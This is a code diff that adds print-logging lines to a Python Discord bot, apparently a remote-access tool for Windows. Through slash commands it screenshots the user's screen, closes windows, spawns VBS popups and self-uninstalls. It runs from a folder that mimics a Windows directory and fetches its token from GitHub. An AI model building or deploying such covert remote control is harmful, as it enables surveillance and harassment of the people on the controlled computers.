@@ -219,6 +219,7 @@ async def on_ready():
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def send_status():
+        print("Sending status...")
         global last_message_id
         channel = client.get_channel(CHANNEL_ID)
         if not channel:
@@ -239,6 +240,7 @@ async def on_ready():
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def update_activity():
+        print("Updating activity...")
         channel = client.get_channel(CHANNEL_ID)
         if not channel:
             return
@@ -256,6 +258,7 @@ async def on_ready():
 
     @tasks.loop(seconds=UPDATE_INTERVAL)
     async def cleanup_old_messages():
+        print("Cleaning up old messages...")
         channel = client.get_channel(CHANNEL_ID)
         if not channel:
             return
@@ -298,6 +301,7 @@ testServerId = [1139988299386195981]
 async def shutdown(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Shutdown command received")
         user_id = interaction.user.id
         await interaction.response.send_message("Taking screenshot before shutdown...")
         screenshot = pyautogui.screenshot()
@@ -318,6 +322,7 @@ async def shutdown(interaction : Interaction):
 
 @client.slash_command(guild_ids=testServerId, description="Shuts down all clients")
 async def shutdown_all(interaction : Interaction):
+    print("Shutdown all command received")
     category = interaction.channel.category
     user_id = interaction.user.id
 
@@ -342,8 +347,10 @@ async def shutdown_all(interaction : Interaction):
 async def status(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Status command received")
         
         user_id = interaction.user.id
+        print("Taking screenshot...")
         await interaction.response.send_message("Taking screenshot...")
         screenshot = pyautogui.screenshot()
         x, y = pyautogui.position()
@@ -359,13 +366,16 @@ async def status(interaction : Interaction):
         embed.set_footer(text=f"Remote Control Bot v{str(ver8)}")
 
         await interaction.send(embed=embed, file=file)
+        print("Screenshot sent")
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
 async def uninstall(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
         
+        print("Uninstall command received")
         user_id = interaction.user.id
+        print("Uninstalling...")
         await interaction.response.send_message("Uninstalling this program all clients...")
         await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
         script_content = """
@@ -423,7 +433,9 @@ sys.exit()
 
 @client.slash_command(guild_ids=testServerId, description="Self-destructs client.")
 async def uninstall_all(interaction : Interaction):
+    print("Uninstall all command received")
     user_id = interaction.user.id
+    print("Uninstalling...")
     await interaction.response.send_message("Uninstalling this program all clients...")
     await interaction.edit_original_message(content="This program has been uninstalled from all clients!")
     script_content = """
@@ -483,8 +495,10 @@ sys.exit()
 async def close_all_windows(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Close all windows command received")
         user_id = interaction.user.id
 
+        print("Closing all windows...")
         def enum_windows_callback(hwnd, windows):
             if win32gui.IsWindowVisible(hwnd):
                 windows.append(hwnd)
@@ -498,15 +512,18 @@ async def close_all_windows(interaction : Interaction):
                 win32gui.PostMessage(hwnd, win32con.WM_CLOSE, 0, 0)
             except Exception as e:
                 print(f"Could not close window {hwnd}: {e}")
+        print("All windows closed")
 
 @client.slash_command(guild_ids=testServerId, description="Select a window to close on client's computer.")
 async def close_selected_window(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Close selected window command received")
         windows = get_open_windows()
 
         if not windows:
             await interaction.response.send_message(content="No open windows found.")
+            print("No open windows found")
             return
 
         class WindowSelect(nextcord.ui.Select):
@@ -531,18 +548,22 @@ async def close_selected_window(interaction : Interaction):
                 super().__init__()
                 self.add_item(WindowSelect())
 
+        print("Sending select window...")
+
         await interaction.response.send_message("Select a window to close:", view=WindowView())
 
 @client.slash_command(guild_ids=testServerId, description="Pops up a message on the client's screen.")
 async def popup(interaction : Interaction, message: str, window_title: Optional[str], repeat: Optional[int]):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Popup command received")
         user_id = interaction.user.id
         fmsg = f"""X=MsgBox("{str(message)}",0+16,"{str(window_title)}")"""
 
         user_profile = os.environ['USERPROFILE']
         target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
 
+        print("Creating popup script...")
         with open(os.path.join(target_path, "skibidi-main", "popup", "popup.vbs"), "w") as po:
             if repeat is None or repeat == 0:
                 repeat = 1
@@ -550,22 +571,31 @@ async def popup(interaction : Interaction, message: str, window_title: Optional[
                 po.write(fmsg + "\n")
             po.close()
 
+
+        print("Popup script created")
+        print("Opening popup window...")
         subprocess.Popen(["wscript", os.path.join(target_path, "skibidi-main", "popup", "popup.vbs")], shell=True)
         
         await interaction.response.send_message(f"Popup window succesfully opened with message: {message}")
+        print("Popup window opened")
 
 @client.slash_command(guild_ids=testServerId, description="Outputs the log file, useful for debugging.")
 async def output_log(interaction : Interaction):
     category = interaction.channel.category
     if str(category) == str(ip):
+        print("Output log command received")
         await interaction.response.send_message("Sending log file...")
         user_profile = os.environ['USERPROFILE']
         target_path = os.path.join(user_profile, 'AppData', 'Local', 'Microsoft', 'Windows')
         log_path = os.path.join(target_path, "skibidi-main", "log.txt")
         file1 = nextcord.File(log_path, filename='log.txt')
         await interaction.send(file=file1)
+        print("Log file sent")
 
+print("Getting token")
 r = requests.get("https://raw.githubusercontent.com/skibidi-123456/skibidi/refs/heads/info/token")
 token = r.text
 stripped_string = token[1:]
+print("Token received")
+print("Running client")
 client.run(stripped_string)
